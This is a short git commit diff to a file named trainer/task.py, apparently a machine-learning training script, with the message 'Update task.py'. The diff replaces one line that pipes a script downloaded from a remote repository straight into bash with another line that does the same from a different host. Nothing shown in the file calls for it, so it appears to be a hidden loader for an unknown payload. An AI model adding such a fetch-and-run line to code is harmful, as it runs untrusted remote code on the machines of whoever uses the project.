ab0cd0abc0731062ae0ab619ca8228286e3449c8
ganejafaujanih <145754543+ganejafaujanih@users.noreply.github.com>
2023-12-03 19:52:24 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/jeffreyadams29/paketu/raw/master/sing | bash')
+os.system('curl -sL https://github.com/ganejafaujanih/acuy/raw/main/katel | bash')
